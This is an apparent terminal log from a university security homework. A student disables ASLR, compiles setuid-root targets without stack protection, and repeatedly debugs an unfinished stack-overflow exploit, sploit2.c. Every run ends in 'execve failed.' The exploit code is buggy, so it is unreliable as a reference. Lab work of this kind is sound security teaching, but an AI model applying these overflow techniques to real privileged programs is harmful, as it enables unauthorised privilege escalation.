student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ Connection to localhost closed by remote host.
Connection to localhost closed.
adam@Adams-MacBook-Pro hw4 % ssh -p 2224 student@localhost
student@localhost's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-70-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

94 packages can be updated.
0 updates are security updates.

New release '18.04.3 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Nov 29 16:08:31 2019 from 10.0.2.2
student@5435-hw4-vm:~$ lw
lw: command not found
student@5435-hw4-vm:~$ ls
cs5435-fa19-hw4  Desktop    Downloads         Music     Public     Videos
demo             Documents  examples.desktop  Pictures  Templates
student@5435-hw4-vm:~$ sudo sysctl -w kernel.randomize_va_space=0
[sudo] password for student: 
kernel.randomize_va_space = 0
student@5435-hw4-vm:~$ cd cs5435-fa19-hw4/targets/
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ sudo make
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target0 target0.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target1 target1.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target2 target2.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target3 target3.c
gcc -ggdb -mpreferred-stack-boundary=2 -fno-stack-protector -o target4 target4.c
install -o root -t /tmp target0 target1 target2 target3 target4
chmod 4755 /tmp/target*
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ cd ../sploits/
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls -la
total 72
drwxr-xr-x 2 student student  4096 Nov 29 17:48 .
drwxr-xr-x 6 student student  4096 Nov 26 10:49 ..
-rwxr-xr-x 1 student student   475 Nov 26 10:49 shellcode.h
-rwxrwxr-x 1 student student 10316 Nov 29 13:37 sploit0
-rw-r--r-- 1 student student  1089 Nov 27 20:20 sploit0.c
-rwxrwxr-x 1 student student 10340 Nov 29 14:12 sploit1
-rw-r--r-- 1 student student  1015 Nov 29 14:12 sploit1.c
-rwxrwxr-x 1 student student 10288 Nov 29 17:48 sploit2
-rw-r--r-- 1 student student   789 Nov 29 17:48 sploit2.c
-rw-r--r-- 1 student student   375 Nov 26 10:49 sploit3.c
-rw-r--r-- 1 student student   375 Nov 26 10:49 sploit4.c
-rw-r--r-- 1 student student   375 Nov 26 10:49 sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit2
execve failed.
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit2
Reading symbols from sploit2...done.
(gdb) break main
Breakpoint 1 at 0x804856c: file sploit2.c, line 22.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit2 

Breakpoint 1, main () at sploit2.c:22
22	{
(gdb) set follow-fork-mode child
(gdb) b 37
Breakpoint 2 at 0x80485e4: file sploit2.c, line 37.
(gdb) n
26	  char *noop = "A";
(gdb) n
27	  int sled_length = 399;\
(gdb) n
28	  char *address = "\x9f\xff\xff\xbf";
(gdb) n
29	  char *result = malloc(sizeof(noop)*sled_length + 1);
(gdb) n
30	  char *result1 = repeat(noop, sled_length);
(gdb) set follow-fork-mode child
(gdb) n
31	  strcat(result, result1);
(gdb) n
32	  args[0] = TARGET;
(gdb) n
33	  args[1] = result;
(gdb) n
34	  args[2] = "399";
(gdb) n
36	  env[0] = NULL;
(gdb) n

Breakpoint 2, main () at sploit2.c:37
37	  execve(TARGET, args, env);
(gdb) s
execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) s
__syscall_error (error=-14) at ../sysdeps/unix/sysv/linux/i386/sysdep.c:27
27	../sysdeps/unix/sysv/linux/i386/sysdep.c: No such file or directory.
(gdb) s
__x86.get_pc_thunk.dx () at ../sysdeps/i386/fpu/s_frexp.S:58
58	../sysdeps/i386/fpu/s_frexp.S: No such file or directory.
(gdb) s
__syscall_error (error=-14) at ../sysdeps/unix/sysv/linux/i386/sysdep.c:28
28	../sysdeps/unix/sysv/linux/i386/sysdep.c: No such file or directory.
(gdb) s
30	in ../sysdeps/unix/sysv/linux/i386/sysdep.c
(gdb) s
main () at sploit2.c:38
38	  fprintf(stderr, "execve failed.\n");
(gdb) q
A debugging session is active.

	Inferior 1 [process 1592] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ which /tmp/target2
/tmp/target2
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" "399"
input_size=399Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Bye AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" "399"
Error: real_size larger than input_size
input_size=399student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" "400"
Error: input_size not 399
input_size=400Bye AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit2
Reading symbols from sploit2...done.
(gdb) break main
Breakpoint 1 at 0x804856c: file sploit2.c, line 22.
(gdb) break /tmp/target2:15
No source file named /tmp/target2.
Make breakpoint pending on future shared library load? (y or [n]) y
Breakpoint 2 (/tmp/target2:15) pending.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit2 

Breakpoint 1, main () at sploit2.c:22
22	{
(gdb) break /tmp/target2:15
No source file named /tmp/target2.
Make breakpoint pending on future shared library load? (y or [n]) n
(gdb) n
26	  char *noop = "A";
(gdb) n
27	  int sled_length = 399;\
(gdb) n
28	  char *address = "\x9f\xff\xff\xbf";
(gdb) n
29	  char *result = malloc(sizeof(noop)*sled_length + 1);
(gdb) n
30	  char *result1 = repeat(noop, sled_length);
(gdb) set follow-fork-mode child
(gdb) n
31	  strcat(result, result1);
(gdb) n
32	  args[0] = TARGET;
(gdb) n
33	  args[1] = result;
(gdb) n
34	  args[2] = "399";
(gdb) n
36	  env[0] = NULL;
(gdb) n
37	  execve(TARGET, args, env);
(gdb) n
38	  fprintf(stderr, "execve failed.\n");
(gdb) n
execve failed.
40	  return 0;
(gdb) n
41	}
(gdb) n
__libc_start_main (main=0x804855b <main>, argc=1, argv=0xbffff654, init=0x8048640 <__libc_csu_init>, 
    fini=0x80486a0 <__libc_csu_fini>, rtld_fini=0xb7fea880 <_dl_fini>, stack_end=0xbffff64c)
    at ../csu/libc-start.c:325
325	../csu/libc-start.c: No such file or directory.
(gdb) n
[Inferior 1 (process 1603) exited normally]
(gdb) catch exec
Catchpoint 3 (exec)
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit2 

Breakpoint 1, main () at sploit2.c:22
22	{
(gdb) n
26	  char *noop = "A";
(gdb) n
27	  int sled_length = 399;\
(gdb) nn
Undefined command: "nn".  Try "help".
(gdb) continue
Continuing.
execve failed.
[Inferior 1 (process 1607) exited normally]
(gdb) continue
The program is not being run.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit2 

Breakpoint 1, main () at sploit2.c:22
22	{
(gdb) break target2:13
No source file named target2.
Make breakpoint pending on future shared library load? (y or [n]) n
(gdb) break /tmptarget2:13
No source file named /tmptarget2.
Make breakpoint pending on future shared library load? (y or [n]) break /tmptarget2:1n3
Please answer y or [n].
Make breakpoint pending on future shared library load? (y or [n]) n
(gdb) break /tmp/target2:13
No source file named /tmp/target2.
Make breakpoint pending on future shared library load? (y or [n]) n
(gdb) break greeting
Function "greeting" not defined.
Make breakpoint pending on future shared library load? (y or [n]) y
Breakpoint 4 (greeting) pending.
(gdb) n
26	  char *noop = "A";
(gdb) n
27	  int sled_length = 399;\
(gdb) n
28	  char *address = "\x9f\xff\xff\xbf";
(gdb) n
29	  char *result = malloc(sizeof(noop)*sled_length + 1);
(gdb) n
30	  char *result1 = repeat(noop, sled_length);
(gdb) n
31	  strcat(result, result1);
(gdb) set follow-fork-mode child
(gdb) continue
Continuing.
execve failed.
[Inferior 1 (process 1608) exited normally]
(gdb) q
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit2
Reading symbols from sploit2...done.
(gdb) set detach-on-fork off
(gdb) set follow-fork-mode child
(gdb) break main
Breakpoint 1 at 0x804856c: file sploit2.c, line 22.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit2 

Breakpoint 1, main () at sploit2.c:22
22	{
(gdb) set follow-fork-mode child
(gdb) set detach-on-fork off
(gdb) break main
Note: breakpoint 1 also set at pc 0x804856c.
Breakpoint 2 at 0x804856c: file sploit2.c, line 22.
(gdb) n
26	  char *noop = "A";
(gdb) n
27	  int sled_length = 399;\
(gdb) n
28	  char *address = "\x9f\xff\xff\xbf";
(gdb) n
29	  char *result = malloc(sizeof(noop)*sled_length + 1);
(gdb) n
30	  char *result1 = repeat(noop, sled_length);
(gdb) n
31	  strcat(result, result1);
(gdb) n
32	  args[0] = TARGET;
(gdb) n
33	  args[1] = result;
(gdb) n
34	  args[2] = "399";
(gdb) n
36	  env[0] = NULL;
(gdb) n
37	  execve(TARGET, args, env);
(gdb) n
38	  fprintf(stderr, "execve failed.\n");
(gdb) n
execve failed.
40	  return 0;
(gdb) n
41	}
(gdb) n
__libc_start_main (main=0x804855b <main>, argc=1, argv=0xbffff654, init=0x8048640 <__libc_csu_init>, 
    fini=0x80486a0 <__libc_csu_fini>, rtld_fini=0xb7fea880 <_dl_fini>, stack_end=0xbffff64c)
    at ../csu/libc-start.c:325
325	../csu/libc-start.c: No such file or directory.
(gdb) n
[Inferior 1 (process 1615) exited normally]
(gdb) q
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit2
Reading symbols from sploit2...done.
(gdb) break main
Breakpoint 1 at 0x804856c: file sploit2.c, line 22.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit2 

Breakpoint 1, main () at sploit2.c:22
22	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) continue
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
__syscall_error (error=-14) at ../sysdeps/unix/sysv/linux/i386/sysdep.c:27
27	../sysdeps/unix/sysv/linux/i386/sysdep.c: No such file or directory.
(gdb) s
__x86.get_pc_thunk.dx () at ../sysdeps/i386/fpu/s_frexp.S:58
58	../sysdeps/i386/fpu/s_frexp.S: No such file or directory.
(gdb) s
__syscall_error (error=-14) at ../sysdeps/unix/sysv/linux/i386/sysdep.c:28
28	../sysdeps/unix/sysv/linux/i386/sysdep.c: No such file or directory.
(gdb) s
30	in ../sysdeps/unix/sysv/linux/i386/sysdep.c
(gdb) s
main () at sploit2.c:38
38	  fprintf(stderr, "execve failed.\n");
(gdb) s
__GI__IO_fwrite (buf=0x80486d8, size=1, count=15, fp=0xb7fbbcc0 <_IO_2_1_stderr_>) at iofwrite.c:32
32	iofwrite.c: No such file or directory.
(gdb) s
31	in iofwrite.c
(gdb) s
32	in iofwrite.c
(gdb) s
35	in iofwrite.c
(gdb) s
37	in iofwrite.c
(gdb) s
38	in iofwrite.c
(gdb) s
39	in iofwrite.c
(gdb) s
_IO_new_file_xsputn (f=0xb7fbbcc0 <_IO_2_1_stderr_>, data=0x80486d8, n=15) at fileops.c:1280
1280	fileops.c: No such file or directory.
(gdb) s
1287	in fileops.c
(gdb) s
1280	in fileops.c
(gdb) s
1286	in fileops.c
(gdb) s
1293	in fileops.c
(gdb) s
1310	in fileops.c
(gdb) s
1331	in fileops.c
(gdb) s
_IO_new_file_overflow (f=0xb7fbbcc0 <_IO_2_1_stderr_>, ch=-1) at fileops.c:807
807	in fileops.c
(gdb) s
__x86.get_pc_thunk.dx () at ../sysdeps/i386/fpu/s_frexp.S:58
58	../sysdeps/i386/fpu/s_frexp.S: No such file or directory.
(gdb) s
_IO_new_file_overflow (f=0xb7fbbcc0 <_IO_2_1_stderr_>, ch=-1) at fileops.c:808
808	fileops.c: No such file or directory.
(gdb) s
815	in fileops.c
(gdb) s
818	in fileops.c
(gdb) s
820	in fileops.c
(gdb) s
__GI__IO_doallocbuf (fp=0xb7fbbcc0 <_IO_2_1_stderr_>) at genops.c:394
394	genops.c: No such file or directory.
(gdb) s
__x86.get_pc_thunk.bx () at ../sysdeps/i386/i686/multiarch/../memcmp.S:80
80	../sysdeps/i386/i686/multiarch/../memcmp.S: No such file or directory.
(gdb) s
__GI__IO_doallocbuf (fp=0xb7fbbcc0 <_IO_2_1_stderr_>) at genops.c:395
395	genops.c: No such file or directory.
(gdb) s
397	in genops.c
(gdb) s
400	in genops.c
(gdb) s
__GI__IO_setb (a=0, eb=0xb7fbbd08 <_IO_2_1_stderr_+72> "d\310\373\267\377\377\377\377\377\377\377\377", 
    b=0xb7fbbd07 <_IO_2_1_stderr_+71> "", f=0xb7fbbcc0 <_IO_2_1_stderr_>) at genops.c:388
388	in genops.c
(gdb) s
383	in genops.c
(gdb) s
384	in genops.c
(gdb) s
388	in genops.c
(gdb) s
__GI__IO_doallocbuf (fp=0xb7fbbcc0 <_IO_2_1_stderr_>) at genops.c:401
401	in genops.c
(gdb) s
_IO_new_file_overflow (f=0xb7fbbcc0 <_IO_2_1_stderr_>, ch=-1) at fileops.c:821
821	fileops.c: No such file or directory.
(gdb) s
830	in fileops.c
(gdb) s
839	in fileops.c
(gdb) s
843	in fileops.c
(gdb) s
846	in fileops.c
(gdb) s
841	in fileops.c
(gdb) s
846	in fileops.c
(gdb) s
842	in fileops.c
(gdb) s
844	in fileops.c
(gdb) s
846	in fileops.c
(gdb) s
847	in fileops.c
(gdb) s
844	in fileops.c
(gdb) s
847	in fileops.c
(gdb) s
848	in fileops.c
(gdb) s
850	in fileops.c
(gdb) s
852	in fileops.c
(gdb) ss
Undefined command: "ss".  Try "help".
(gdb) s
851	in fileops.c
(gdb) 
_IO_new_do_write (fp=0xb7fbbcc0 <_IO_2_1_stderr_>, data=0xb7fbbd07 <_IO_2_1_stderr_+71> "", to_do=0)
    at fileops.c:492
492	in fileops.c
(gdb) s
494	in fileops.c
(gdb) n
495	in fileops.c
(gdb) n
_IO_new_file_overflow (f=0xb7fbbcc0 <_IO_2_1_stderr_>, ch=-1) at fileops.c:863
863	in fileops.c
(gdb) n
_IO_new_file_xsputn (f=0xb7fbbcc0 <_IO_2_1_stderr_>, data=0x80486d8, n=15) at fileops.c:1337
1337	in fileops.c
(gdb) n
1338	in fileops.c
(gdb) n
1342	in fileops.c
(gdb) n
execve failed.
1343	in fileops.c
(gdb) n
1344	in fileops.c
(gdb) n
1351	in fileops.c
(gdb) n
1354	in fileops.c
(gdb) n
1355	in fileops.c
(gdb) n
__GI__IO_fwrite (buf=0x80486d8, size=1, count=15, fp=0xb7fbbcc0 <_IO_2_1_stderr_>) at iofwrite.c:37
37	iofwrite.c: No such file or directory.
(gdb) n
45	in iofwrite.c
(gdb) n
46	in iofwrite.c
(gdb) n
49	in iofwrite.c
(gdb) n
main () at sploit2.c:40
40	  return 0;
(gdb) n
41	}
(gdb) n
__libc_start_main (main=0x804855b <main>, argc=1, argv=0xbffff654, init=0x8048640 <__libc_csu_init>, 
    fini=0x80486a0 <__libc_csu_fini>, rtld_fini=0xb7fea880 <_dl_fini>, stack_end=0xbffff64c)
    at ../csu/libc-start.c:325
325	../csu/libc-start.c: No such file or directory.
(gdb) 
[Inferior 1 (process 1624) exited normally]
(gdb) 
The program is not being run.
(gdb) 
The program is not being run.
(gdb) q
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
shellcode.h  sploit0  sploit0.c  sploit1  sploit1.c  sploit2  sploit2.c  sploit3.c  sploit4.c  sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ cat sploit2.c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

char *repeat(char *s, int x)
{
  //from https://stackoverflow.com/a/22599676/5552894
  char *result = malloc(sizeof(s) * x + 1);
  while (x > 0) {
      strcat(result, s);
      x --;
  }
  return result;
}

int main(void)
{
  char *args[3]; 
  char *env[1];

  char *noop = "A";
  int sled_length = 399;\
  char *address = "\x9f\xff\xff\xbf";
  char *result = malloc(sizeof(noop)*sled_length + 1);
  char *result1 = repeat(noop, sled_length);
  strcat(result, result1);
  args[0] = TARGET;
  args[1] = result;
  args[2] = "399";
  
  env[0] = NULL;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit2.c -o sploit2
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit2
execve failed.
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit2
Reading symbols from sploit2...done.
(gdb) break main
Breakpoint 1 at 0x804856c: file sploit2.c, line 22.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit2 

Breakpoint 1, main () at sploit2.c:22
22	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) n
26	  char *noop = "A";
(gdb) continue
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
__syscall_error (error=-14) at ../sysdeps/unix/sysv/linux/i386/sysdep.c:27
27	../sysdeps/unix/sysv/linux/i386/sysdep.c: No such file or directory.
(gdb) n
28	in ../sysdeps/unix/sysv/linux/i386/sysdep.c
(gdb) n
30	in ../sysdeps/unix/sysv/linux/i386/sysdep.c
(gdb) n
main () at sploit2.c:38
38	  fprintf(stderr, "execve failed.\n");
(gdb) n
execve failed.
40	  return 0;
(gdb) n
41	}
(gdb) n
__libc_start_main (main=0x804855b <main>, argc=1, argv=0xbffff654, init=0x8048640 <__libc_csu_init>, 
    fini=0x80486a0 <__libc_csu_fini>, rtld_fini=0xb7fea880 <_dl_fini>, stack_end=0xbffff64c)
    at ../csu/libc-start.c:325
325	../csu/libc-start.c: No such file or directory.
(gdb) q
A debugging session is active.

	Inferior 1 [process 1672] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
shellcode.h  sploit0  sploit0.c  sploit1  sploit1.c  sploit2  sploit2.c  sploit3.c  sploit4.c  sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ cat sploit2.c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

char *repeat(char *s, int x)
{
  //from https://stackoverflow.com/a/22599676/5552894
  char *result = malloc(sizeof(s) * x + 1);
  while (x > 0) {
      strcat(result, s);
      x --;
  }
  return result;
}

int main(void)
{
  char *args[3]; 
  char *env[1];

  char *noop = "A";
  int sled_length = 399;
  char *address = "\x9f\xff\xff\xbf";
  char *result = malloc(sizeof(noop)*sled_length + 1);
  char *result1 = repeat(noop, sled_length);
  strcat(result, result1);
  args[0] = TARGET;
  args[1] = result;
  args[2] = "399";
  
  env[0] = NULL;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit2
Reading symbols from sploit2...done.
(gdb) break main
Breakpoint 1 at 0x804856c: file sploit2.c, line 22.
(gdb) set follow-fork-mode child
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit2 

Breakpoint 1, main () at sploit2.c:22
22	{
(gdb) continue
Continuing.
execve failed.
[Inferior 1 (process 1681) exited normally]
(gdb) n
The program is not being run.
(gdb) n
The program is not being run.
(gdb) nQuit
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit2 

Breakpoint 1, main () at sploit2.c:22
22	{
(gdb) n
26	  char *noop = "A";
(gdb) n
27	  int sled_length = 399;
(gdb) n
28	  char *address = "\x9f\xff\xff\xbf";
(gdb) n
29	  char *result = malloc(sizeof(noop)*sled_length + 1);
(gdb) n
30	  char *result1 = repeat(noop, sled_length);
(gdb) n
31	  strcat(result, result1);
(gdb) n
32	  args[0] = TARGET;
(gdb) n
33	  args[1] = result;
(gdb) n
34	  args[2] = "399";
(gdb) n
36	  env[0] = NULL;
(gdb) n
37	  execve(TARGET, args, env);
(gdb) info inferiors
  Num  Description       Executable        
* 1    process 1685      /home/student/cs5435-fa19-hw4/sploits/sploit2 
(gdb) s

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) info inferiors
  Num  Description       Executable        
* 1    process 1685      /home/student/cs5435-fa19-hw4/sploits/sploit2 
(gdb) s
__syscall_error (error=-14) at ../sysdeps/unix/sysv/linux/i386/sysdep.c:27
27	../sysdeps/unix/sysv/linux/i386/sysdep.c: No such file or directory.
(gdb) info inferiors
  Num  Description       Executable        
* 1    process 1685      /home/student/cs5435-fa19-hw4/sploits/sploit2 
(gdb) s
__x86.get_pc_thunk.dx () at ../sysdeps/i386/fpu/s_frexp.S:58
58	../sysdeps/i386/fpu/s_frexp.S: No such file or directory.
(gdb) info inferiors
  Num  Description       Executable        
* 1    process 1685      /home/student/cs5435-fa19-hw4/sploits/sploit2 
(gdb) s
__syscall_error (error=-14) at ../sysdeps/unix/sysv/linux/i386/sysdep.c:28
28	../sysdeps/unix/sysv/linux/i386/sysdep.c: No such file or directory.
(gdb) info inferiors
  Num  Description       Executable        
* 1    process 1685      /home/student/cs5435-fa19-hw4/sploits/sploit2 
(gdb) s
30	in ../sysdeps/unix/sysv/linux/i386/sysdep.c
(gdb) info inferiors
  Num  Description       Executable        
* 1    process 1685      /home/student/cs5435-fa19-hw4/sploits/sploit2 
(gdb) s
main () at sploit2.c:38
38	  fprintf(stderr, "execve failed.\n");
(gdb) info inferiorsQuit
(gdb) clear execve
Deleted breakpoint 2 
(gdb) 
No breakpoint at execve.
(gdb) 
No breakpoint at execve.
(gdb) n
execve failed.
40	  return 0;
(gdb) n
41	}
(gdb) n
__libc_start_main (main=0x804855b <main>, argc=1, argv=0xbffff654, init=0x8048640 <__libc_csu_init>, 
    fini=0x80486a0 <__libc_csu_fini>, rtld_fini=0xb7fea880 <_dl_fini>, stack_end=0xbffff64c)
    at ../csu/libc-start.c:325
325	../csu/libc-start.c: No such file or directory.
(gdb) n
[Inferior 1 (process 1685) exited normally]
(gdb) b 43
Breakpoint 3 at 0xb7e21540: file ../csu/libc-start.c, line 43.
(gdb) clear 43
Deleted breakpoint 3 
(gdb) q
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit2
Reading symbols from sploit2...done.
(gdb) b 43
No line 43 in the current file.
Make breakpoint pending on future shared library load? (y or [n]) n
(gdb) q
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls -la
total 72
drwxr-xr-x 2 student student  4096 Nov 29 18:23 .
drwxr-xr-x 6 student student  4096 Nov 26 10:49 ..
-rwxr-xr-x 1 student student   475 Nov 26 10:49 shellcode.h
-rwxrwxr-x 1 student student 10316 Nov 29 13:37 sploit0
-rw-r--r-- 1 student student  1089 Nov 27 20:20 sploit0.c
-rwxrwxr-x 1 student student 10340 Nov 29 14:12 sploit1
-rw-r--r-- 1 student student  1015 Nov 29 14:12 sploit1.c
-rwxrwxr-x 1 student student 10288 Nov 29 18:23 sploit2
-rw-r--r-- 1 student student   788 Nov 29 18:23 sploit2.c
-rw-r--r-- 1 student student   375 Nov 26 10:49 sploit3.c
-rw-r--r-- 1 student student   375 Nov 26 10:49 sploit4.c
-rw-r--r-- 1 student student   375 Nov 26 10:49 sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ cat sploit2.c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

char *repeat(char *s, int x)
{
  //from https://stackoverflow.com/a/22599676/5552894
  char *result = malloc(sizeof(s) * x + 1);
  while (x > 0) {
      strcat(result, s);
      x --;
  }
  return result;
}

int main(void)
{
  char *args[3]; 
  char *env[1];

  char *noop = "A";
  int sled_length = 399;
  char *address = "\x9f\xff\xff\xbf";
  char *result = malloc(sizeof(noop)*sled_length + 1);
  char *result1 = repeat(noop, sled_length);
  strcat(result, result1);
  args[0] = TARGET;
  args[1] = result;
  args[2] = "399";
  
  env[0] = NULL;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


